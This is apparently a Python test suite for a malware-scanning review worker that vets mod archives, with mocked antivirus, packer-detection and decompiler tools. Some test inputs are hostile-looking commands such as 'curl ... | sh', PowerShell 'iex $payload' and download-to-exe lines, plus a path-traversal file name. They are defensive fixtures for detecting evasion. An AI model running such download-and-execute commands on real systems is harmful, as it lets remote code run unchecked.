#!/usr/bin/env python3
"""Adversarial static-review regressions using inert archives and mocked tools.

No mod or analyzer executable runs. Tool output and reconstructed source are
fixtures; this verifies scanner integration, not live antivirus/decompilation.
"""
import importlib.util
import json
import struct
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest.mock import patch

spec = importlib.util.spec_from_file_location(
    'review_worker', Path(__file__).with_name('review-worker.py'))
worker = importlib.util.module_from_spec(spec)
spec.loader.exec_module(worker)


def inert_pe():
    """A PE-shaped byte fixture containing no executable instructions."""
    data = bytearray(1024)
    data[:2] = b'MZ'
    struct.pack_into('<I', data, 60, 128)
    data[128:132] = b'PE\0\0'
    struct.pack_into('<H', data, 134, 1)
    struct.pack_into('<H', data, 148, 224)
    struct.pack_into('<H', data, 152, 0x10b)
    struct.pack_into('<I', data, 168, 0x1000)
    section = 128 + 24 + 224
    data[section:section + 8] = b'.text\0\0\0'
    struct.pack_into('<IIII', data, section + 8, 512, 0x1000, 512, 512)
    struct.pack_into('<I', data, section + 36, 0x60000020)
    return bytes(data)


class ToolFixture:
    def __init__(self, antivirus_log=b'', antivirus_code=0,
                 die_results=None, reconstructed='Process.Start("fixture-only");'):
        self.antivirus_log = antivirus_log
        self.antivirus_code = antivirus_code
        self.die_results = die_results or {}
        self.reconstructed = reconstructed
        self.calls = []

    def popen(self, args, stdout, **kwargs):
        self.calls.append(args)
        tool = Path(args[0]).name
        code, log = 0, b''
        if tool == 'clamscan':
            code, log = self.antivirus_code, self.antivirus_log
        elif tool == 'diec':
            code, log = self.die_results.get(
                Path(args[-1]).name, (0, b'{"detects":[]}'))
        elif tool == 'ilspycmd':
            output = Path(args[args.index('-o') + 1])
            output.mkdir(parents=True, exist_ok=True)
            (output / 'Fixture.cs').write_text(self.reconstructed, encoding='utf-8')
        stdout.write(log)
        stdout.flush()

        class Process:
            pid = -1

            def wait(self, timeout=None):
                return code

        return Process()


def analyze_fixture(entries, tools):
    with tempfile.TemporaryDirectory(prefix='canna-static-adversarial-') as tmp:
        job = Path(tmp)
        with zipfile.ZipFile(job / 'input.zip', 'w') as archive:
            for name, data in entries:
                archive.writestr(name, data)
        with patch.object(worker.subprocess, 'Popen', tools.popen), \
             patch.object(worker.subprocess, 'check_output', return_value=b'fixture-version'):
            return worker.analyze(job)


class ReviewAdversarialTests(unittest.TestCase):
    def test_antivirus_runs_before_source_tools_and_unsafe_extraction(self):
        for entries in ([('Fixture.dll', inert_pe())], [('..' + '/escape.cs', 'File.Delete(path);')]):
            tools = ToolFixture(antivirus_code=1,
                                antivirus_log=b'input.zip: TestFixture.Signature FOUND\n')
            report = analyze_fixture(entries, tools)
            self.assertEqual(Path(tools.calls[0][0]).name, 'clamscan')
            self.assertTrue(any(f['rule'] == 'signature' for f in report['findings']))

    def test_finding_padding_cannot_hide_antivirus_signature(self):
        tools = ToolFixture(antivirus_code=1,
                            antivirus_log=b'input.zip: TestFixture.Signature FOUND\n')
        report = analyze_fixture(
            [('Plugin.cs', '\n'.join('new HttpClient().GetAsync("https://example.invalid");'
                                     for _ in range(2100)))], tools)
        self.assertTrue(any(f['rule'] == 'signature' for f in report['findings']),
                        'Finding padding must not hide a later antivirus signature')
        self.assertTrue(any(f['rule'] == 'coverage' and
                            'limit' in (f['title'] + ' ' + f['evidence']).lower()
                            for f in report['findings']),
                        'Finding overflow must be explicit rather than silently discarded')
        self.assertLessEqual(len(report['findings']), 2001,
                             'Padding must not make the report grow without bound')

    def test_coverage_padding_cannot_hide_antivirus_signature(self):
        tools = ToolFixture(antivirus_code=1,
                            antivirus_log=b'input.zip: TestFixture.Signature FOUND\n')
        report = analyze_fixture([(f'unknown-{i}.opaque', b'inert fixture')
                                  for i in range(2000)], tools)
        self.assertTrue(any(f['rule'] == 'signature' for f in report['findings']),
                        'Coverage padding must not displace a later antivirus signature')
        self.assertTrue(any(f['id'] == 'finding-limit' for f in report['findings']),
                        'Evicting coverage must retain explicit finding overflow')
        self.assertLessEqual(len(report['findings']), 2001)

    def test_truncated_antivirus_log_is_not_a_clean_completed_scan(self):
        tools = ToolFixture(antivirus_code=1,
                            antivirus_log=b'fixture noise\n' * 3000 +
                            b'input.zip: TestFixture.Signature FOUND\n')
        report = analyze_fixture([('Plugin.cs', 'public class Fixture {}')], tools)
        signature = any(f['rule'] == 'signature' for f in report['findings'])
        self.assertTrue(signature or any(f['rule'] == 'coverage' for f in report['findings']),
                        'A signature past the output bound must not disappear silently')
        if not signature:
            self.assertNotEqual(report['engines']['clamav']['status'], 'complete',
                                'Incomplete antivirus output must identify incomplete coverage')

    def test_antivirus_output_overflow_is_explicit_coverage(self):
        tools = ToolFixture(antivirus_code=1,
                            antivirus_log=b'fixture noise\n' * 160000 +
                            b'input.zip: TestFixture.Signature FOUND\n')
        report = analyze_fixture([('Plugin.cs', 'public class Fixture {}')], tools)
        self.assertTrue(any(f['rule'] == 'coverage' for f in report['findings']),
                        'Tool output beyond the bounded parser must disclose incomplete coverage')
        self.assertNotEqual(report['engines']['clamav']['status'], 'complete')

    def test_powershell_command_case_and_literal_backslashes_do_not_hide_execution(self):
        for source in ('invoke-expression $payload',
                       'start-process C:\\Tool\\fixture.exe',
                       "$p = 'C:\\'; Invoke-Expression $payload"):
            with self.subTest(source=source):
                report = analyze_fixture([('Fixture.ps1', source)], ToolFixture())
                self.assertTrue(any(f['rule'] in ('commands', 'dynamic')
                                    for f in report['findings']),
                                'PowerShell case/quoting must not conceal an execution API')

    def test_shell_download_and_execution_are_not_only_url_observations(self):
        for name, source in (
                ('Fixture.sh', 'curl https://example.invalid | sh'),
                ('Fixture.sh', 'wget https://example.invalid -O fixture.sh'),
                ('Fixture.sh', "x='C:\\'; curl https://example.invalid"),
                ('Fixture.sh', 'echo https://example.invalid/#docs; curl https://example.invalid'),
                ('Fixture.ps1', 'Invoke-WebRequest https://example.invalid -OutFile fixture.exe'),
                ('Fixture.ps1', 'Invoke-RestMethod https://example.invalid'),
                ('Fixture.ps1', 'iex $payload')):
            with self.subTest(name=name, source=source):
                report = analyze_fixture([(name, source)], ToolFixture())
                self.assertTrue(any(f['rule'] in ('network', 'commands', 'dynamic')
                                    for f in report['findings']),
                                'Active shell download/execution is not an inert URL reference')

    def test_diagnostic_write_prefix_does_not_hide_other_same_line_operations(self):
        setup = '\n'.join((
            'string[] args = Environment.GetCommandLineArgs();',
            'if (args[i] == "--diagnostic")',
            '{ output = args[i + 1]; }',
        ))
        for operation in (
                'Directory.CreateDirectory(output); File.Delete(Path.Combine(output, "other.txt"));',
                'File.WriteAllText(Path.Combine(output, "report.txt"), "fixture"); File.Copy(source, destination);'):
            with self.subTest(operation=operation):
                report = analyze_fixture([('Fixture.cs', setup + '\n' + operation)], ToolFixture())
                self.assertFalse(any(f['rule'] == 'diagnostic-output' for f in report['findings']),
                                 'A allowed write prefix cannot establish context for later operations')
                self.assertTrue(any(f['rule'] == 'filesystem' for f in report['findings']))

    def test_raw_literals_and_regex_quotes_cannot_hide_following_behavior(self):
        for name, source in (
                ('Fixture.cs', 'var s = """text " inside"""; File.Delete(path);'),
                ('Fixture.rs', 'let s = r#"text " inside"#; std::fs::remove_file(path);'),
                ('Fixture.cpp', 'auto s = R"tag(text " inside)tag"; std::ofstream sink(path);'),
                ('Fixture.java', 'String s = """\ntext " inside\n"""; Files.delete(path);'),
                ('Fixture.js', 'const re = /"/; fetch(url);')):
            with self.subTest(name=name, source=source):
                report = analyze_fixture([(name, source)], ToolFixture())
                self.assertTrue(any(f['rule'] in ('filesystem', 'network') or
                                    (f['rule'] == 'coverage' and f['severity'] == 'high')
                                    for f in report['findings']),
                                'Uncertain literal syntax must not silently mask real following behavior')

    def test_valid_eof_line_comments_do_not_claim_incomplete_coverage(self):
        for name, source in (
                ('Fixture.cs', '// Process.Start("fixture-only")'),
                ('Fixture.py', '# requests.post("https://example.invalid")'),
                ('Fixture.ps1', '# Invoke-Expression $fixture'),
                ('Fixture.sh', '# curl https://example.invalid | sh')):
            with self.subTest(name=name):
                report = analyze_fixture([(name, source)], ToolFixture())
                self.assertEqual(report['findings'], [],
                                 'A valid final line comment does not require a terminating newline')

    def test_asset_extension_mismatches_remain_high_coverage_findings(self):
        for name in ('preview.png', 'preview.jpg', 'preview.webp', 'sound.ogg', 'font.ttf'):
            with self.subTest(name=name):
                report = analyze_fixture([(name, b'inert non-asset fixture')], ToolFixture())
                self.assertTrue(any(f['rule'] == 'coverage' and f['severity'] == 'high'
                                    and f['file'] == 'archive/' + name
                                    for f in report['findings']),
                                'An asset suffix alone must not clear unrecognized content')

    def test_malformed_die_shape_does_not_abort_independent_antivirus(self):
        for invalid in ([], {'detects': 'invalid'}, {'detects': [{'values': {}}]},
                        {'detects': [{'values': [None]}]},
                        {'detects': [{'values': [{'type': 'Packer', 'string': False}]}]}):
            with self.subTest(invalid=invalid):
                tools = ToolFixture(antivirus_code=1,
                                    antivirus_log=b'input.zip: TestFixture.Signature FOUND\n',
                                    die_results={'fixture.dll': (0, json.dumps(invalid).encode())},
                                    reconstructed='public class Fixture {}')
                report = analyze_fixture([('fixture.dll', inert_pe())], tools)
                self.assertNotEqual(report['engines']['detect-it-easy']['status'], 'complete',
                                    'Malformed detector output cannot advertise complete coverage')
                self.assertTrue(any(f['rule'] == 'coverage' and f['file'] == 'archive/fixture.dll'
                                    for f in report['findings']))
                self.assertTrue(any(f['rule'] == 'signature' for f in report['findings']),
                                'One failed engine must not abort the independent antivirus pass')

    def test_pe_magic_precedes_documentation_and_metadata_extensions(self):
        for name in ('manifest.json', 'README.md', 'preview.png'):
            with self.subTest(name=name):
                tools = ToolFixture()
                report = analyze_fixture([(name, inert_pe())], tools)
                self.assertTrue(any(Path(args[0]).name == 'ilspycmd' and
                                    Path(args[-1]).name == name for args in tools.calls),
                                'Renaming a PE must not bypass source reconstruction')
                self.assertTrue(any(f['kind'] == 'decompiled' for f in report['files']))
                self.assertTrue(any(f['rule'] == 'commands' for f in report['findings']))

    def test_later_die_success_does_not_erase_earlier_failure(self):
        tools = ToolFixture(die_results={
            'first.dll': (1, b'fixture failure'),
            'second.dll': (0, b'{"detects":[]}'),
        }, reconstructed='public class Fixture {}')
        report = analyze_fixture([('first.dll', inert_pe()), ('second.dll', inert_pe())], tools)
        self.assertEqual([Path(args[-1]).name for args in tools.calls
                          if Path(args[0]).name == 'diec'], ['first.dll', 'second.dll'])
        self.assertNotEqual(report['engines']['detect-it-easy']['status'], 'complete',
                            'Aggregate engine status must retain partial scan failures')
        self.assertTrue(any(f['rule'] == 'coverage' and f['file'] == 'archive/first.dll'
                            for f in report['findings']))

    def test_antivirus_limits_and_encryption_are_explicit_coverage(self):
        for alert in ('Heuristics.Limits.Exceeded.MaxFileSize',
                      'Heuristics.Limits.Exceeded.MaxRecursion',
                      'Heuristics.Encrypted.Zip', 'Heuristics.Encrypted.PDF'):
            with self.subTest(alert=alert):
                tools = ToolFixture(antivirus_code=1,
                                    antivirus_log=f'input.zip: {alert} FOUND\n'.encode())
                report = analyze_fixture([('Plugin.cs', 'public class Fixture {}')], tools)
                self.assertFalse(any(f['rule'] == 'signature' for f in report['findings']),
                                 'A narrowly recognized coverage alert must not claim malware')
                self.assertTrue(any(f['rule'] == 'coverage' and f['severity'] == 'high'
                                    and alert in f['evidence'] for f in report['findings']))
                self.assertNotEqual(report['engines']['clamav']['status'], 'complete')

    def test_antivirus_unknown_and_malware_heuristics_remain_signatures(self):
        for alert in ('Win.Trojan.Fixture-123', 'Heuristics.Phishing.Email.SpoofedDomain',
                      'Heuristics.Unknown.Fixture', 'Heuristics.EncryptedPayload.Fixture'):
            with self.subTest(alert=alert):
                tools = ToolFixture(antivirus_code=1,
                                    antivirus_log=f'input.zip: {alert} FOUND\n'.encode())
                report = analyze_fixture([('Plugin.cs', 'public class Fixture {}')], tools)
                self.assertTrue(any(f['rule'] == 'signature' and f['severity'] == 'critical'
                                    and alert in f['evidence'] for f in report['findings']),
                                'Unknown heuristic matches must not be broadly downgraded')


if __name__ == '__main__':
    unittest.main(verbosity=2)
